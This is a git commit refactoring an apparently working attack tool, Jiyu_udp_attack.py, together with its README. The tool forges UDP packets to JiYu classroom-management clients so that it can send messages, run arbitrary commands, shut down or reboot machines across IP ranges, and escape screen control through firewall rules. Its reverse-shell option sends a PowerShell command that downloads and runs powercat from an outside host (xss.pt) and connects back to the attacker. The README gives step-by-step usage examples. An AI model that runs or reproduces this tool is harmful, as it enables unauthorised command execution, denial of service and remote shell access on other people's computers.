bbf431672b3ab3f3234b1d9536146c7ac8171eba
ht0Ruial <2096766786@qq.com>
2021-01-06 17:52:35 +0800

    代码重构优化

--- Jiyu_udp_attack.py
+++ Jiyu_udp_attack.py
@@ -1,9 +1,12 @@
 import sys
 import socket
-from os import popen, system
+import random
+import argparse
 from re import compile
 from time import sleep
 from struct import pack
+from os import popen, system
+from multiprocessing import Pool
 
 store = [[0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb, 0xa0, 0xe7, 0x52, 0x40, 0x91, 
           0xdc, 0x27, 0xa3, 0xb6, 0xf9, 0x29, 0x2e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x91, 0x03, 0x00, 0x00, 0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
@@ -15,60 +18,39 @@ store = [[0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00
          [0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xc8, 0xe3, 0x97, 0xfd, 0xc0, 0xb5, 0x9f, 0x45, 0x87, 0x72, 0x05, 0xbd, 0x4e, 0x46, 0xa8, 0x96, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0x73, 0x51, 0xed, 0x95, 0xa8, 0x60, 0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]]
 
 basicCMD = {
-        '-msg' : store[0],
-        '-c' : store[1],
-        '-r' : store[2],
-        '-s' :store[3],
-    }
+    '-msg': store[0],
+    '-c': store[1],
+    '-r': store[2],
+    '-s': store[3],
+}
 
-error_msg = """
-    Usage: %s -ip ip_address -p port -msg/-c/-r/-s xxx
+header = """
+                                
+    ------------------- Github Repositories -------------------
+                        详细说明请看项目文档
+            https://github.com/ht0Ruial/Jiyu_udp_attack
 
-        -ip   ip addres IP地址                 example:   -ip   192.168.80.23
-                                                                192.168.80.122/24
-        -p    port, default = 4705 端口，默认为4705
-
-        -msg  send message 发送消息                        -msg  HelloWord!
-
-        -c    command 命令                                 -c   "cmd.exe /c ipconfig" 
-                                                                calc.exe
-        -r    reboot 重启
-
-        -s    shutdown 关机
-
-        -l    loop * times, default = 1 循环次数，默认为1
-
-        -t    loop interval, default = 22 s 循环时间间隔，默认是22秒
-
-
-        -------------------- Extra Options --------------------
-        
-        -nc   反弹shell的机器需出网，退出可使用命令exit
-        
-        -g    single options, Gets the current Intranet IP and student 
-              client possible ports. 
-              独立选项，获取当前的ip地址以及学生端监听的端口。
-              If choose this options, other are become invalid. 
-              如果选择了这个选项，其他选项将会失效。
-         
-        -break     独立选项，脱离屏幕控制，需要管理员权限
-
-        -continue  独立选项，恢复屏幕控制
-
-        """ % sys.argv[0]
-aasr = """
-    < Error : Options error!! >
 """
+parser = argparse.ArgumentParser(header)
+parser.add_argument('-ip', type=str, help="ip 指定目标IP地址")
+parser.add_argument('-p', type=int, default=4705, help="port 指定监听端口，默认端口为4705")
+parser.add_argument(
+    '-msg', type=str, help="send_message发送消息 eg: -msg  \"HelloWord!\"")
+parser.add_argument(
+    '-c', type=str, help="command命令 eg: -c   \"cmd.exe /c ipconfig\"")
+parser.add_argument('-l', type=int, default=1, help="循环次数，默认为1")
+parser.add_argument('-t', type=int, default=22, help="循环时间间隔，默认是22秒")
 
-
-# 判断该字符串是否为数字
-def judge_is_num(s):
-    flag = True
-    for n in s:
-        if n not in '0123456789':
-            flag = False
-            break
-    return flag
+parser.add_argument('-e', type=str, choices=['r', 's', 'g', 'nc', 'break', 'continue'], help="Extra Options加载额外的选项 eg：-e r"
+                    )
+subparsers = parser.add_subparsers(help='-e 参数的详细说明')
+subparsers.add_parser('r', help='reboot 重启')
+subparsers.add_parser('s', help='shutdown 关机')
+subparsers.add_parser('g', help='独立选项，获取当前的ip地址以及学生端监听的端口')
+subparsers.add_parser('nc', help='独立选项，反弹shell的机器需出网，退出可使用命令exit')
+subparsers.add_parser('break', help='独立选项，脱离屏幕控制，需要管理员权限')
+subparsers.add_parser('continue', help='独立选项，恢复屏幕控制')
+args = parser.parse_args()
 
 
 # 格式化要发送的消息
@@ -97,10 +79,10 @@ def get_ip(ip):
         print('\nYou enter a error IP.')
         print("Please enter the correct format of the IP again.")
         sys.exit(0)
-    if ip.find('-') != -1 :
+    if ip.find('-') != -1:
         ip_arr = ip.split('-')
         ip_arrs = ip_arr[0].split('.')
-        if int(ip_arr[1]) >254:
+        if int(ip_arr[1]) > 254:
             ip_arr[1] = '254'
         for i in range(int(ip_arrs[3]), int(ip_arr[1])+1):
             ip_arrs[3] = str(i)
@@ -139,76 +121,47 @@ def pkg_sendlist(cmdtype, content):
 
 
 # 发送
-def send(config, send_list):
+def send(send_list):
     if len(send_list) == 0:
-        print(error_msg, aasr)
+        print("[-] error 请使用 -h 以获取命令帮助")
         sys.exit(0)
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    target_host = get_ip(config['ip'])
-    for times in range(config['l']):
+    target_host = get_ip(args.ip)
+    for times in range(args.l):
         for i in target_host:
             for abc in send_list:
                 payload = pack("%dB" % (len(abc)), *abc)
-                client.sendto(payload, (i, config['port']))
-        if config['l'] == 1:
-            print("发送成功")        
-        else:
-            print("第%s次执行完毕" % str(times + 1))
-            if times != config['l'] - 1:
-                sleep(config['t'])
+                client.sendto(payload, (i, args.p))
+        if args.l == 1:
+            print("发送成功")
+            sys.exit(0)
+        print("第%s次执行完毕" % str(times + 1))
+        if times != args.l - 1:
+            sleep(args.t)
 
 
-def creat_send_object(command):
-    config = {
-        'ip' : '',
-        'port' : 4705,
-        't' : 22,
-        'l' : 1,
-    }
+def creat_send_object():
     send_list = []
 
-    # 获取ip
-    if '-ip' in command:
-        config['ip'] = command[command.index('-ip') + 1]
-
-    # 获取端口
-    if '-p' in command:
-        if judge_is_num(command[command.index('-p') + 1]):
-            config['port'] = int(command[command.index('-p') + 1])
-    
     # 获取命令内容
-    if '-msg' in command:
-        send_list.append(pkg_sendlist('-msg', command[command.index('-msg') + 1]))
+    if args.msg:
+        send_list.append(pkg_sendlist('-msg', args.msg))
 
-    if '-c' in command:
-        send_list.append(pkg_sendlist('-c', command[command.index('-c') + 1]))
+    if args.c:
+        send_list.append(pkg_sendlist('-c', args.c))
 
-    if '-r' in command:
+    if args.e == 'r':
         send_list.append(basicCMD['-r'])
 
-    if '-s' in command:
+    if args.e == 's':
         send_list.append(basicCMD['-s'])
 
-    if '-t' in command:
-        if judge_is_num(command[command.index('-t') + 1]):
-            config['t'] = int(command[command.index('-t') + 1])
-
-    if '-l' in command:
-        if judge_is_num(command[command.index('-l') + 1]):
-            config['l'] = int(command[command.index('-l') + 1])
-
-    if '-nc' in command:
-        hostname = socket.gethostname()
-        ip = socket.gethostbyname(hostname)
-        cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p 39077 -e cmd".format(ip)
-        send_list.append(pkg_sendlist('-c', cmd))
-
-    return config, send_list
+    return send_list
 
 
-def single_command(command):
-    if '-g' in command:
-        try :
+def single_command():
+    if args.e == 'g':
+        try:
             hostname = socket.gethostname()
             ip = socket.gethostbyname(hostname)
             print("\nYour ip addres is:" + ip)
@@ -219,40 +172,54 @@ def single_command(command):
 
             netstat = popen("netstat -ano |find \"{}\"".format(pid)).read()
             pattern = compile(r"%s:\d{1,5}\s*[*]{1}" % ip)
-            netstat_pat =pattern.findall(netstat)
+            netstat_pat = pattern.findall(netstat)
 
-            ports= [((i.strip(ip)[1:-1]).rstrip()) for i in netstat_pat]
+            ports = [((i.strip(ip)[1:-1]).rstrip()) for i in netstat_pat]
             print("\nYour student client possible ports are:" + ','.join(ports))
         except:
             pass
         sys.exit(0)
 
-
-    elif '-break' in command:
+    elif args.e == 'break':
         popen('sc config MpsSvc start= auto')
         popen('net start MpsSvc')
         popen('netsh advfirewall set allprofiles state on')
         popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=block')
+        sleep(1)
+        system("cls")
         sys.exit(0)
 
-    elif '-continue' in command:
+    elif args.e == 'continue':
         popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=allow')
         sys.exit(0)
 
 
-def run_from_cmd(command):
+def netcat(num):
+    send_list = []
+    hostname = socket.gethostname()
+    ip = socket.gethostbyname(hostname)
+    cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p {} -e cmd".format(ip, num)
+    send_list.append(pkg_sendlist('-c', cmd))
+    send(send_list)
+
+
+def run_from_cmd():
     try:
-        single_command(command)
-        config, send_list = creat_send_object(sys.argv)
-        send(config, send_list)
-        if '-nc' in command:
-            system("powershell.exe IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -l -p 39077")
+        single_command()
+        if args.e != 'nc':
+            send_list = creat_send_object()
+            send(send_list)
+            sys.exit(0)
+        num = random.randint(1, 65535)
+        pool = Pool(processes=1)
+        pool.apply_async(netcat, (num,))
+        print("listening on [any] {} ...".format(num))
+        system("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -l -p {}".format(num))
+        pool.close()
+        pool.join()
     except Exception as e:
-        print(error_msg, aasr)
         print("[-] %s" % e)
 
 
 if __name__ == '__main__':
-    run_from_cmd(sys.argv)
-    
-
+    run_from_cmd()
--- README.md
+++ README.md
@@ -5,6 +5,11 @@
 + Python3
 
 ## 版本说明
+v1.4
+- 代码重构，优化参数选取逻辑
+- 反弹shell功能增加随机端口
+- 更新文档
+
 v1.3
 - 脱离/恢复屏幕控制
 - 支持反弹shell
@@ -23,96 +28,106 @@ v1.0
 
 ## 使用方法：
 ```
-    Usage: Jiyu_udp_attack.py -ip ip_address -p port -msg/-c/-r/-s xxx
+usage:
 
-        -ip   ip addres IP地址                 example:   -ip   192.168.80.23
-                                                                192.168.80.122/24
-        -p    port, default = 4705 端口，默认为4705
+    ------------------- Github Repositories -------------------
+            https://github.com/ht0Ruial/Jiyu_udp_attack
 
-        -msg  send message 发送消息                        -msg  HelloWord!
+       [-h] -ip IP [-p P] [-msg MSG] [-c C] [-l L] [-t T]
+       [-e {r,s,g,nc,break,continue}]
+       {r,s,g,nc,break,continue} ...
 
-        -c    command 命令                                 -c   "cmd.exe /c ipconfig" 
-                                                                calc.exe
-        -r    reboot 重启
+positional arguments:
+  {r,s,g,nc,break,continue}
+                        -e 参数的详细说明
+    r                   reboot 重启
+    s                   shutdown 关机
+    g                   独立选项，获取当前的ip地址以及学生端监听的端口
+    nc                  独立选项，反弹shell的机器需出网，退出可使用命令exit
+    break               独立选项，脱离屏幕控制，需要管理员权限
+    continue            独立选项，恢复屏幕控制
 
-        -s    shutdown 关机
-
-        -l    loop * times, default = 1 循环次数，默认为1
-
-        -t    loop interval, default = 22 s 循环时间间隔，默认是22秒
-
-
-        -------------------- Extra Options --------------------
-        
-        -nc   反弹shell，使用命令exit退出
-        
-        -g    single options, Gets the current Intranet IP and student 
-              client possible ports. 
-              独立选项，获取当前的ip地址以及学生端监听的端口。
-              If choose this options, other are become invalid. 
-              如果选择了这个选项，其他选项将会失效。
-         
-        -break     独立选项，脱离屏幕控制，需要管理员权限
-
-        -continue  独立选项，恢复屏幕控制
-
-
+optional arguments:
+  -h, --help            show this help message and exit
+  -ip IP                ip 指定目标IP地址
+  -p P                  port 指定监听端口，默认端口为4705
+  -msg MSG              send_message发送消息 eg: -msg "HelloWord!"
+  -c C                  command命令 eg: -c "cmd.exe /c ipconfig"
+  -l L                  循环次数，默认为1
+  -t T                  循环时间间隔，默认是22秒
+  -e {r,s,g,nc,break,continue}
+                        Extra Options加载额外的选项 eg：-e r
           
 ```
 
 ## 使用例子
 
+### Tips:
+使用 **-ip** 参数指定目标IP时，可以有以下几种指定方式：
+- 指定单个IP，如  192.168.80.12
+- 指定IP范围，如 192.168.80.10-56
+- 指定IP所在C段，如 192.168.80.1/24
+
+
+
 ### 1.获取内网ip地址及监听的端口
+若学生端监听端口不是默认的**4705**，则在后续操作过程中需使用 **-p** 参数指定端口
 ```
-python Jiyu_udp_attack.py -g
+python Jiyu_udp_attack.py -e g
 ```
 
 ### 2.脱离屏幕控制
 当前运行权限需为管理员权限，主要用于开启MpsSvc服务
 ```
-python Jiyu_udp_attack.py -break
+python Jiyu_udp_attack.py -e break
 ```
 
 ### 3.恢复屏幕控制
 ```
-python Jiyu_udp_attack.py -continue
+python Jiyu_udp_attack.py -e continue
 ```
 
 ### 4.发送消息
-向IP地址为192.168.80.12的机器发送一条内容为"hello,baby!"的消息
+若学生端监听端口为**4705**，向IP地址为192.168.80.12的机器发送一条内容为"hello,baby!"的消息
 ```
-python Jiyu_udp_attack.py -ip 192.168.80.12 -p -msg "hello,baby!"
+python Jiyu_udp_attack.py -ip 192.168.80.12 -msg "hello,baby!"
+
+```
+
+若学生端监听端口为**4605**，需使用 **-p** 参数指定端口，向IP地址为192.168.80.12的机器发送一条内容为"hello,baby!"的消息
+```
+python Jiyu_udp_attack.py -ip 192.168.80.12 -p 4605 -msg "hello,baby!"
 
 ```
 
 ### 5.执行命令
 给192.168.80.12到192.168.80.137弹一个计算器
 ```
-python Jiyu_udp_attack.py -ip 192.168.80.12-137 -p -c calc.exe
+python Jiyu_udp_attack.py -ip 192.168.80.12-137 -c calc.exe
 ```
 
 ### 6.反弹shell
-反弹shell时，IP只能为某个机器IP，不能批量反弹，而且机器需要出网
+反弹shell时，IP只能为某个机器IP，不能批量反弹，而且机器需要出网<br>
 因为已经实现批量的任意命令执行，考虑到批量反弹也没啥意义，遂不添加
 ```
-python Jiyu_udp_attack.py -ip 192.168.80.12 -p -nc
+python Jiyu_udp_attack.py -ip 192.168.80.12 -e nc
 ```
 
 ### 7.关机重启
 关机
 ```
-python Jiyu_udp_attack.py -ip 192.168.80.12 -p -s
+python Jiyu_udp_attack.py -ip 192.168.80.12 -e s
 ```
 重启
 ```
-python Jiyu_udp_attack.py -ip 192.168.80.12 -p -r
+python Jiyu_udp_attack.py -ip 192.168.80.12 -e r
 ```
 
 ### 8.循环
 利用循环持续发送消息<br>
 1-254的机器会收到一条"hello,baby!"的消息，50s后会继续执行，共执行3次
 ```
-    python Jiyu_udp_attack.py -ip 192.168.80.23/24 -p -msg "hello,baby!" -l 3 -t 50
+    python Jiyu_udp_attack.py -ip 192.168.80.23/24 -msg "hello,baby!" -l 3 -t 50
 ```
 
 
